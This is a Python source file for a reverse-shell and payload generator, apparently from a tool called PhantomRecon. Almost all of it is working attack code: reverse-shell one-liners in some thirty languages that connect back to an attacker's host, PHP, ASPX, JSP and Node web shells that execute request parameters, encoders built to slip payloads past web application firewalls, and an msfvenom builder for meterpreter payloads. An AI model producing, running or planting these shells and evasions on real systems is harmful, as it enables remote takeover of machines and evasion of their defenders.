"""
payload_gen.py
==============
Reverse Shell & Payload Generator (20+ languages):
  Languages: bash, sh, nc, python, python3, perl, php, ruby, java, powershell,
             golang, rust, awk, lua, nodejs, groovy, tcl, r, socat, crystal,
             dart, kotlin, swift, c, csharp, meterpreter, xterm

WAF Bypass Encodings:
  - URL encoding (single, double)
  - HTML entity encoding
  - Base64 (inline decode)
  - Hex encoding
  - Unicode escape
  - IFS substitution (bash)
  - Concatenation bypass
  - Case variation
  - Null byte insertion
  - Comment injection
  - Command separators

Payload types:
  - Reverse shell
  - Bind shell
  - Web shell (PHP, ASPX, JSP, Python WSGI)
  - ICMP shell
  - Msfvenom command builder
  - Stageless/staged payload selection
"""

from __future__ import annotations

import base64
import binascii
import html
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, Iterator, List, Optional


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class Payload:
    language:    str
    description: str
    raw:         str
    encoded:     Optional[str] = None
    encoding:    Optional[str] = None


# ---------------------------------------------------------------------------
# Reverse shell templates
# ---------------------------------------------------------------------------

REVERSE_SHELLS: Dict[str, str] = {
    "bash_tcp": (
        "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    ),
    "bash_196": (
        "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196"
    ),
    "bash_read_line": (
        "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"
    ),
    "sh_tcp": (
        "sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    ),
    "nc_basic": (
        "nc -e /bin/sh {LHOST} {LPORT}"
    ),
    "nc_mkfifo": (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
    ),
    "nc_openbsd": (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
    ),
    "python": (
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python3": (
        "python3 -c 'import os,pty,socket;s=socket.socket();"
        "s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(\"/bin/bash\")'"
    ),
    "python3_pty": (
        "export RHOST={LHOST};export RPORT={LPORT};python3 -c "
        "'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    ),
    "perl_no_sh": (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");"
        "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php_proc_open": (
        "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh\","
        "[0=>$s,1=>$s,2=>$s],$pipes);'"
    ),
    "ruby": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "ruby_no_sh": (
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
    ),
    "java": (
        "r = Runtime.getRuntime();"
        "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()"
    ),
    "powershell": (
        "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};$client.Close()"
    ),
    "powershell_b64": (
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sb = (iex $data 2>&1 | Out-String);$sb2 = $sb + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    ),
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";func main(){{"
        "c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");"
        "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go &"
    ),
    "rust": (
        "use std::process::Command;use std::net::TcpStream;use std::os::unix::io::{{RawFd,FromRawFd}};"
        "use std::io::{{Read,Write}};fn main(){{"
        "let s=TcpStream::connect(\"{LHOST}:{LPORT}\").unwrap();let fd=s.into_raw_fd();"
        "Command::new(\"/bin/sh\").arg(\"-i\")"
        ".stdin(unsafe{{std::process::Stdio::from_raw_fd(fd)}})"
        ".stdout(unsafe{{std::process::Stdio::from_raw_fd(fd)}})"
        ".stderr(unsafe{{std::process::Stdio::from_raw_fd(fd)}})"
        ".spawn().unwrap().wait().unwrap();}}"
    ),
    "awk": (
        "awk 'BEGIN{{s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) "
        "{{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} "
        "while(c != \"exit\") close(s); }}}}' /dev/null"
    ),
    "lua": (
        "lua -e \"require('socket');require('os');"
        "t=socket.tcp();t:connect('{LHOST}','{LPORT}');"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "nodejs": (
        "(function(){{"
        "var net = require('net'),"
        "cp = require('child_process'),"
        "sh = cp.spawn('/bin/sh', []);"
        "var client = new net.Socket();"
        "client.connect({LPORT}, '{LHOST}', function(){{"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
        "return /a/;}})();"
    ),
    "groovy": (
        "String host=\"{LHOST}\";int port={LPORT};String cmd=\"/bin/bash\";"
        "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
        "Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),"
        "pe=p.getErrorStream(),si=s.getInputStream();"
        "OutputStream po=p.getOutputStream(),so=s.getOutputStream();"
        "while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());"
        "while(pe.available()>0)so.write(pe.read());"
        "while(si.available()>0)po.write(si.read());so.flush();po.flush();"
        "Thread.sleep(50);try{{p.exitValue();break;}}catch(e){{}}}};p.destroy();s.close()"
    ),
    "tcl": (
        "echo 'set s [socket {LHOST} {LPORT}];while 1 {{puts -nonewline $s \"> \";"
        "flush $s;gets $s c;set e [catch {{exec $c}} r];puts $s $r;flush $s}}' | tclsh"
    ),
    "socat": (
        "socat TCP:{LHOST}:{LPORT} EXEC:/bin/sh"
    ),
    "socat_pty": (
        "socat TCP:{LHOST}:{LPORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
    ),
    "xterm": (
        "xterm -display {LHOST}:1"
    ),
    "c": (
        "#include<stdio.h>\\n#include<unistd.h>\\n#include<netinet/in.h>\\n"
        "#include<sys/types.h>\\n#include<sys/socket.h>\\n"
        "int main(void){{int s;struct sockaddr_in a;"
        "s=socket(AF_INET,SOCK_STREAM,0);"
        "a.sin_port=htons({LPORT});a.sin_family=AF_INET;"
        "a.sin_addr.s_addr=inet_addr(\"{LHOST}\");"
        "connect(s,(struct sockaddr*)&a,sizeof(a));"
        "dup2(s,0);dup2(s,1);dup2(s,2);"
        "execve(\"/bin/sh\",0,0);}}"
    ),
    "csharp": (
        "using System;using System.Net;using System.Net.Sockets;"
        "using System.Text;using System.Diagnostics;"
        "public class S{{public static void Main(){{"
        "TcpClient c=new TcpClient(\"{LHOST}\",{LPORT});"
        "NetworkStream st=c.GetStream();"
        "byte[] b=new byte[65536];int i;"
        "while((i=st.Read(b,0,b.Length))>0){{"
        "Process p=new Process();"
        "p.StartInfo.FileName=\"/bin/sh\";"
        "p.StartInfo.Arguments=\"-c \"+Encoding.ASCII.GetString(b,0,i);"
        "p.StartInfo.RedirectStandardOutput=true;"
        "p.StartInfo.UseShellExecute=false;"
        "p.Start();string o=p.StandardOutput.ReadToEnd();"
        "byte[] ob=Encoding.ASCII.GetBytes(o);"
        "st.Write(ob,0,ob.Length);}};c.Close();}}}}"
    ),
    "kotlin": (
        "import java.net.Socket;import java.io.*;import java.lang.Runtime;"
        "fun main(){{val s=Socket(\"{LHOST}\",{LPORT});"
        "val p=Runtime.getRuntime().exec(\"/bin/sh\");"
        "val i=p.inputStream;val o=p.outputStream;"
        "val si=s.getInputStream();val so=s.getOutputStream();"
        "Thread{{si.copyTo(o)}}.start();"
        "Thread{{i.copyTo(so)}}.start();"
        "p.waitFor()}}"
    ),
    "r": (
        "r <- getOption('repos');r['CRAN'] = 'http://cran.us.r-project.org';"
        "options(repos = r);install.packages('tcp');library(tcp);"
        "s <- make.socket('{LHOST}', as.integer('{LPORT}'));"
        "while (TRUE) {{ c <- read.socket(s);"
        "r <- system(c, intern = TRUE); write.socket(s, r)}}"
    ),
    "swift": (
        "import Foundation;"
        "let t=Thread{{let s=Socket(family:.inet,type:.stream,proto:.tcp)!;"
        "try! s.connect(to:\"{LHOST}\",port:{LPORT});"
        "let p=Process();p.executableURL=URL(fileURLWithPath:\"/bin/sh\");"
        "p.arguments=[\"-i\"];p.standardInput=s.inputStream;"
        "p.standardOutput=s.outputStream;try! p.run();p.waitUntilExit()}};"
        "t.start()"
    ),
    "crystal": (
        "require \"socket\";s=TCPSocket.new(\"{LHOST}\",{LPORT});"
        "p=Process.new(\"/bin/sh\",input: s,output: s,error: s);"
        "p.wait"
    ),
    "dart": (
        "import 'dart:io';"
        "main() async{{"
        "var s = await Socket.connect('{LHOST}', {LPORT});"
        "var p = await Process.start('/bin/sh', ['-i']);"
        "s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);}}"
    ),
}


# ---------------------------------------------------------------------------
# Web shells
# ---------------------------------------------------------------------------

WEB_SHELLS = {
    "php_minimal":  "<?php system($_GET['cmd']); ?>",
    "php_exec":     "<?php echo exec($_REQUEST['cmd']); ?>",
    "php_passthru": "<?php passthru($_GET['cmd']); ?>",
    "php_b64":      "<?php eval(base64_decode($_POST['code'])); ?>",
    "php_full": (
        "<?php if(isset($_REQUEST['cmd'])){{echo \"<pre>\";$cmd=$_REQUEST['cmd'];"
        "$output=shell_exec($cmd.' 2>&1');echo htmlentities($output);echo \"</pre>\";}}"
        "if(isset($_POST['file'])){{file_put_contents($_POST['filename'],$_POST['content']);}}"
        "?>"
    ),
    "aspx": (
        "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %>"
        "<script runat=\"server\">"
        "protected void Page_Load(object sender, EventArgs e){{"
        "if(Request[\"cmd\"] != null){{"
        "Process p = new Process();"
        "p.StartInfo.FileName = \"cmd.exe\";"
        "p.StartInfo.Arguments = \"/c \" + Request[\"cmd\"];"
        "p.StartInfo.RedirectStandardOutput = true;"
        "p.StartInfo.UseShellExecute = false;"
        "p.Start();"
        "Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");}}}}"
        "</script>"
    ),
    "jsp": (
        "<%@ page import=\"java.util.*,java.io.*\"%>"
        "<%if(request.getParameter(\"cmd\")!=null){{"
        "Process child=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));"
        "InputStream in=child.getInputStream();"
        "int c;while((c=in.read())!=-1)out.print((char)c);in.close();}%>"
    ),
    "python_wsgi": (
        "def application(environ,start_response):"
        "import subprocess,os;"
        "cmd=environ.get('QUERY_STRING','').replace('cmd=','')"
        "if cmd:"
        "out=subprocess.getoutput(cmd)"
        "else:out='PhantomRecon WebShell'"
        "start_response('200 OK',[('Content-Type','text/plain')])"
        "return [out.encode()]"
    ),
    "nodejs_express": (
        "const express=require('express');const {exec}=require('child_process');"
        "const app=express();"
        "app.get('/cmd',(req,res)=>exec(req.query.cmd,(e,o)=>res.send(o||e+'')));"
        "app.listen(8888);"
    ),
}


# ---------------------------------------------------------------------------
# WAF bypass encodings
# ---------------------------------------------------------------------------

class WAFBypassEncoder:
    def url_encode(self, payload: str, double: bool = False) -> str:
        encoded = urllib.parse.quote(payload, safe="")
        if double:
            encoded = urllib.parse.quote(encoded, safe="")
        return encoded

    def html_entity(self, payload: str) -> str:
        return html.escape(payload)

    def base64_inline(self, payload: str, lang: str = "bash") -> str:
        b64 = base64.b64encode(payload.encode()).decode()
        if lang == "bash":
            return f"echo {b64}|base64 -d|bash"
        if lang == "python":
            return f"python3 -c \"import base64,os;os.system(base64.b64decode('{b64}').decode())\""
        if lang == "powershell":
            b64_utf16 = base64.b64encode(payload.encode("utf-16-le")).decode()
            return f"powershell -EncodedCommand {b64_utf16}"
        return b64

    def hex_encode(self, payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def unicode_escape(self, payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def ifs_substitution(self, command: str) -> str:
        return command.replace(" ", "${IFS}")

    def concatenation(self, command: str) -> str:
        parts = list(command)
        result = ""
        for i, ch in enumerate(parts):
            if i == 0:
                result += f'"{ch}"'
            else:
                result += f'"{ch}"'
        return "+".join(result.split("+"))

    def case_variation(self, command: str) -> str:
        import random
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in command)

    def null_byte(self, payload: str) -> str:
        return payload.replace("/bin/sh", "/bi\x00n/sh")

    def comment_injection_sql(self, payload: str) -> str:
        return payload.replace(" ", "/**/")

    def encode_all(self, payload: str) -> Dict[str, str]:
        return {
            "url_single":      self.url_encode(payload),
            "url_double":      self.url_encode(payload, double=True),
            "html_entity":     self.html_entity(payload),
            "base64_bash":     self.base64_inline(payload, "bash"),
            "base64_python":   self.base64_inline(payload, "python"),
            "base64_ps":       self.base64_inline(payload, "powershell"),
            "hex":             self.hex_encode(payload),
            "unicode":         self.unicode_escape(payload),
            "ifs_sub":         self.ifs_substitution(payload),
            "case_variation":  self.case_variation(payload),
            "sql_comment":     self.comment_injection_sql(payload),
        }


# ---------------------------------------------------------------------------
# Msfvenom command builder
# ---------------------------------------------------------------------------

class MsfvenomBuilder:
    PAYLOADS = {
        "linux_x64_reverse_tcp":   "linux/x64/shell_reverse_tcp",
        "linux_x86_reverse_tcp":   "linux/x86/shell_reverse_tcp",
        "linux_x64_meterpreter":   "linux/x64/meterpreter/reverse_tcp",
        "windows_x64_reverse_tcp": "windows/x64/shell_reverse_tcp",
        "windows_x64_meterpreter": "windows/x64/meterpreter/reverse_tcp",
        "windows_x86_reverse_tcp": "windows/shell_reverse_tcp",
        "osx_reverse_tcp":         "osx/x64/shell_reverse_tcp",
        "android_meterpreter":     "android/meterpreter/reverse_tcp",
        "php_reverse":             "php/reverse_php",
        "python_reverse":          "python/shell_reverse_tcp",
        "java_reverse":            "java/shell_reverse_tcp",
        "powershell_reverse":      "windows/powershell_reverse_tcp",
    }

    FORMATS = {
        "linux": "elf", "windows": "exe", "php": "raw",
        "python": "raw", "java": "jar", "osx": "macho",
    }

    def build_cmd(self, payload_name: str, lhost: str, lport: int,
                   output: str = "payload.bin", encoder: Optional[str] = None,
                   iterations: int = 1, extra: Optional[str] = None) -> str:
        payload = self.PAYLOADS.get(payload_name, payload_name)
        fmt     = "elf" if "linux" in payload else "exe" if "windows" in payload else "raw"
        cmd = (
            f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {output}"
        )
        if encoder:
            cmd += f" -e {encoder} -i {iterations}"
        if extra:
            cmd += f" {extra}"
        return cmd

    def get_all_commands(self, lhost: str, lport: int) -> Dict[str, str]:
        return {name: self.build_cmd(name, lhost, lport) for name in self.PAYLOADS}


# ---------------------------------------------------------------------------
# Master Payload Generator
# ---------------------------------------------------------------------------

class PayloadGenerator:
    def __init__(self):
        self.encoder = WAFBypassEncoder()
        self.msfvenom = MsfvenomBuilder()

    def reverse_shell(self, lhost: str, lport: int,
                      language: Optional[str] = None) -> List[Payload]:
        payloads = []
        shells   = {k: v for k, v in REVERSE_SHELLS.items()
                    if not language or k.startswith(language)}
        for name, template in shells.items():
            raw = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
            payloads.append(Payload(
                language=name.split("_")[0],
                description=f"Reverse shell ({name})",
                raw=raw,
            ))
        return payloads

    def web_shell(self, shell_type: Optional[str] = None) -> List[Payload]:
        shells = {k: v for k, v in WEB_SHELLS.items()
                  if not shell_type or shell_type in k}
        return [Payload(language=k.split("_")[0], description=k, raw=v)
                for k, v in shells.items()]

    def encode_payload(self, payload: str, encoding: str = "base64_bash") -> str:
        all_enc = self.encoder.encode_all(payload)
        return all_enc.get(encoding, payload)

    def generate_all(self, lhost: str, lport: int) -> Dict:
        return {
            "reverse_shells": {
                p.description: p.raw
                for p in self.reverse_shell(lhost, lport)
            },
            "web_shells": {
                p.description: p.raw
                for p in self.web_shell()
            },
            "msfvenom_commands": self.msfvenom.get_all_commands(lhost, lport),
            "waf_encodings_example": self.encoder.encode_all(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        }
